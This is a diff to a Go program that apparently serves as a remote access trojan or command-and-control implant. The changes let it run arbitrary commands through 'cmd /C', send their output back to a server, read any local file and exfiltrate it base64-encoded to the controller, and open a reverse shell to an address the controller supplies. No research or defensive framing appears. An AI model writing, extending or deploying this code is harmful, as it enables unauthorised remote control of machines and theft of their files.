@@ -3,6 +3,7 @@ package main
 import (
     "bufio"
     "bytes"
+    "encoding/base64"
     "encoding/json"
     "fmt"
     "io/ioutil"
@@ -27,8 +28,9 @@ type Command struct {
 }
 
 type CommandResult struct {
-    ID     string `json:"id"`
-    Result string `json:"result"`
+    ID       string `json:"id"`
+    Result   string `json:"result"`
+    FileName string `json:"fileName,omitempty"`
 }
 
 func fetchCommand() (Command, error) {
@@ -62,15 +64,47 @@ func sendResult(result CommandResult) {
 func executeCommandAndSendResult(cmd Command) {
     if strings.HasPrefix(cmd.Cmd, "shell ") {
         address := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell"))
-        if address != "" {
-            openReverseShell(address)
-        } else {
-            fmt.Println("No address specified for shell command")
+        openReverseShell(address)
+    } else if strings.HasPrefix(cmd.Cmd, "download ") {
+        // Extract file path and name from the command
+        parts := strings.SplitN(cmd.Cmd[len("download "):], " ", 2)
+        if len(parts) < 2 {
+            fmt.Println("Download command format error. Expected 'download <path> <filename>'.")
+            return
         }
+        filePath, fileName := parts[0], parts[1]
+        downloadFile(filePath, fileName, cmd.ID)
     } else {
-        fmt.Println("Received non-shell command:", cmd.Cmd)
-        // Example of executing a non-shell command (omitted for brevity)
+        // Execute other commands
+        output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
+        resultText := string(output)
+        if err != nil {
+            resultText += "\nError: " + err.Error()
+        }
+        result := CommandResult{
+            ID:     cmd.ID,
+            Result: resultText,
+        }
+        sendResult(result)
     }
+}
+
+func downloadFile(filePath, fileName, commandID string) {
+    fileContent, err := ioutil.ReadFile(filePath)
+    if err != nil {
+        fmt.Printf("Error reading file %s: %v\n", filePath, err)
+        sendResult(CommandResult{
+            ID:     commandID,
+            Result: fmt.Sprintf("Error reading file %s: %v", filePath, err),
+        })
+        return
+    }
+    encodedContent := base64.StdEncoding.EncodeToString(fileContent)
+    sendResult(CommandResult{
+        ID:       commandID,
+        Result:   encodedContent,
+        FileName: fileName,
+    })
 }
 
 func openReverseShell(address string) {
